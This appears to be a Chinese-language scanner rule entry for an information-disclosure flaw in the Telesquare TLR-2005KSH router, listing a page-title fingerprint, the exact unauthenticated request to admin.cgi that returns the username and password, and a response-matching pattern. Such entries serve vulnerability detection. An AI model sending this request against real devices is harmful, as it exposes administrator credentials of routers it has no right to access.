# telesquaretlr2005getusernamepassword信息泄露漏洞

telesquaretlr2005getusernamepassword ｜ 信息泄露 ｜ —
- **指纹**：`title="TLR-2005KSH"`
- **请求**：`GET /cgi-bin/admin.cgi?Command=getUsernamePassword HTTP/1.1`
- **响应特征**：200 ^(?=.*?username)(?=.*?password).*?$